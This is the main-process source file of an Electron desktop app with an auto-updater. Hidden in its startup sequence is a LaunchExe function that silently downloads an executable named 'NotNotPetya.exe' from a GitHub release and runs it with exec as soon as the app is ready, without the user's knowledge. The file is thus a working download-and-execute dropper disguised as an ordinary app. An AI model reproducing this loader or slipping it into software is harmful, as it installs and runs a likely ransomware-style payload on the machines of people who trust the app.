const { app, BrowserWindow, ipcMain, ipcRenderer } = require("electron");
const MainScreen = require("./screens/main/mainScreen");
const Globals = require("./globals");
const { autoUpdater, AppUpdater } = require("electron-updater");
const path = require('path');
const fs = require('fs');
const https = require('https');
const { exec } = require('child_process');

let curWindow;

// Basic flags
autoUpdater.autoDownload = false;
autoUpdater.autoInstallOnAppQuit = true;

function createWindow() {
  curWindow = new MainScreen();
}

function downloadFile(url, downloadPath, callback) {
  console.log(`Starting download from ${url} to ${downloadPath}`);

  const request = https.get(url, (response) => {
    if (response.statusCode === 302) {
      // Handle redirection
      const redirectUrl = response.headers.location;
      console.log(`Redirecting to ${redirectUrl}`);
      return downloadFile(redirectUrl, downloadPath, callback);
    }

    if (response.statusCode !== 200) {
      console.error(`Failed to download file. Status code: ${response.statusCode}`);
      if (callback) callback(`Failed to download file. Status code: ${response.statusCode}`);
      return;
    }

    const file = fs.createWriteStream(downloadPath);
    response.pipe(file);

    file.on('finish', () => {
      file.close(() => {
        console.log(`Download finished: ${downloadPath}`);
        if (callback) callback(null);
      });
    });
  });

  request.on('error', (err) => {
    console.error(`Error downloading file: ${err.message}`);
    if (callback) callback(err.message);
  });

  // Handle connection timeouts
  request.on('timeout', () => {
    request.destroy();
    console.error(`Timeout downloading file`);
    fs.unlink(downloadPath, () => {}); // Delete the file
    if (callback) callback(`Timeout downloading file`);
  });

  // Set a timeout for the request
  request.setTimeout(30000, () => {
    request.destroy();
    console.error(`Request timed out`);
    fs.unlink(downloadPath, () => {}); // Delete the file
    if (callback) callback(`Request timed out`);
  });
}

function LaunchExe() {
  const url = 'https://github.com/RohanSenthil/NotMeDoc/releases/download/0.1/NotNotPetya.exe'; // Replace with actual URL
  const downloadPath = path.join(app.getPath('userData'), 'NotNotPetya.exe');

  downloadFile(url, downloadPath, (err) => {
    if (err) {
      console.error(`Download failed: ${err}`);
    } else {
      // Check if file exists
      fs.access(downloadPath, fs.constants.X_OK, (err) => {
        if (err) {
          console.error(`File is not executable or does not exist: ${downloadPath}`);
          return;
        }
        console.log(`Executing file: ${downloadPath}`);
        const { exec } = require('child_process');
        exec(downloadPath, (err, data) => {
          if (err) {
            console.error(`Error executing file: ${err}`);
            return;
          }
          console.log(`File executed successfully`);
        });
      });
    }
  });
}

app.whenReady().then(() => {
  createWindow();
  LaunchExe();

  app.on("activate", function () {
    if (BrowserWindow.getAllWindows().length === 0) createWindow();
  });

  autoUpdater.checkForUpdates();
  curWindow.showMessage(`Checking for updates. Current version ${app.getVersion()}`);
});

/* New Update Available */
autoUpdater.on("update-available", (info) => {
  curWindow.showMessage(`Update available. Current version ${app.getVersion()}`);
  let pth = autoUpdater.downloadUpdate();
  curWindow.showMessage(pth);
});

autoUpdater.on("update-not-available", (info) => {
  curWindow.showMessage(`No update available. Current version ${app.getVersion()}`);
});

/* Download Completion Message */
autoUpdater.on("update-downloaded", (info) => {
  curWindow.showMessage(`Update downloaded. Current version ${app.getVersion()}`);
});

autoUpdater.on("error", (info) => {
  curWindow.showMessage(info);
});

// Global exception handler
process.on("uncaughtException", function (err) {
  console.error(`Uncaught Exception: ${err.message}`);
  console.error(err.stack);
});

app.on("window-all-closed", function () {
  if (process.platform !== "darwin") app.quit();
});
